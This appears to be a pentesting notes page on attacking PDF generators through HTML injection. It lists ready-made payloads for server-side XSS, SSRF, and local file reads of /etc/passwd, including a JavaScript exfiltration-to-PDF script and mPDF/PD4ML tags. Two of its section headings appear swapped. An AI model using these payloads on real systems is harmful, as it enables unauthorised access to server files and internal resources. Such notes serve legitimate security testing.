+++
title = 'PDF Generators'
date = 2026-10-30
type = 'notes'
weight = 40
toc = true
tags = ['web', 'web-technologies', 'pdf', 'ssrf']
+++

Many web applications provide a PDF generation functionality which may contain dynamic user input.\
Some of these generators may be vulnerable due to HTML injection, allowing several attacks.

***

## PDF Library Enumeration

Determining the PDF generation library used by a web application may be pretty easy: most of them add information in the metadata of the generated file such as the library name and version.

To display the metadata of a PDF file, there are multiple options:

1. Read the Document properties from your browser's PDF viewer.
2. Use `exiftool example.pdf`
3. Use `pdfinfo example.pdf`

<figure class="notes-figure">
  <img src="/images/notes/pdf-metadata.webp" alt="Reading a PDF file&#x27;s metadata from Google Chrome" width="1047" height="600" loading="lazy">
  <figcaption>Reading a PDF file&#x27;s metadata from Google Chrome</figcaption>
</figure>

***

## Server-Side XSS 

```
<b>test</b>
<script>document.write('example')</script>
<script>document.write(window.location)</script>
```

***

## SSRF

```
<img src="http://example.com"/>
<link rel="stylesheet" href="http://example.com">
<iframe src="http://example.com"></iframe>
```

## Local File Inclusion

#### Requiring JavaScript execution

```
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

#### Without JavaScript execution

A better payload that requires JavaScript execution (and base64-decode) is:

```javascript
<script>
    function addNewlines(str) {
        var result = '';
        while (str.length > 0) {
            result += str.substring(0, 100) + '\n';
            str = str.substring(100);
        }
        return result;
    }

    x = new XMLHttpRequest();
    x.onload = function(){
        document.write(addNewlines(btoa(this.responseText)))
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

#### Leveraging the Library's Features

**mPDF < 6.0.0 annotation tag:**\
`<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />`

**PD4ML attachment:**\
`<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>`
